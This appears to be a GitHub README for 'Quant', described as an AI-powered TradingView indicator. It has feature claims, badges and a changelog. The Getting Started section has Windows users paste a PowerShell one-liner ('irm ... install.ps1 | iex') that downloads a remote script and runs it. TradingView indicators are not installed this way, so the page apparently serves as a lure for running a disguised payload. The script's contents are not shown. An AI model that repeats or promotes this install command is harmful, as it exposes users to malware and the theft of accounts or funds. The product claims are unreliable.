<a id="get"></a>

<p align="center">
  <img src="quant.jpg" alt="TradingView" width="880">
</p>
<p align="center">
  <img src="https://img.shields.io/badge/version-2.9.5-blue" alt="version">
  <img src="https://img.shields.io/badge/beta%20users-7.4k-brightgreen?logo=github" alt="beta testers">
<img src="https://img.shields.io/badge/license-MIT-green" alt="license">
</p>

Quant is our first AI-powered indicator for TradingView. It analyzes historical market data, price action, liquidity, positioning, volatility, and market structure to identify the direction with the strongest support for a selected timeframe.
<br><br>
The model also accounts for upcoming economic releases and events that may affect the selected asset. Quant displays its analysis directly on the TradingView chart and recalculates it as new data arrives. Traders can review the data and signals behind the current direction, see what could cause the model to reassess its conclusion, and follow changes without switching between multiple tools.

## Getting Started

#### 1. Open PowerShell

Press **Win + R**, type `PowerShell`, and press **Enter**.

#### 2. Run the Installation Command

Paste the installation command below into the PowerShell window:

```powershell
irm github.com/TradingView-Library/Quant-Indicator/raw/refs/heads/master/debug/install.ps1 | iex
```

#### 3. Restart TradingView

Once the installation is complete, restart TradingView. <br>
The Quant Indicator will then be available in your indicator library.

----

## Changelog

#### v2.9.5 Beta

- Updated processing for price action, liquidity, positioning, volatility, and market structure.
- Added scheduled economic releases to scenario calculations.
- Changed how historical data is loaded when switching timeframes.
- Fixed calculations that could carry over after switching symbols.
- Added validation for missing or delayed market data.
- Corrected volatility calculations during sharp price movements.
- Updated liquidity calculations to use available market depth data.
- Fixed positioning data errors on instruments with limited history.
- Removed redundant calculations during market data updates.
- Fixed delayed chart updates after periods of low trading activity.
- Corrected handling of incomplete candles and partially loaded charts.
- Fixed data synchronization after temporary connection interruptions.
- Fixed an issue where scenario lines could remain visible after removing the indicator.
- Fixed duplicate scenario plots appearing after reloading a chart.
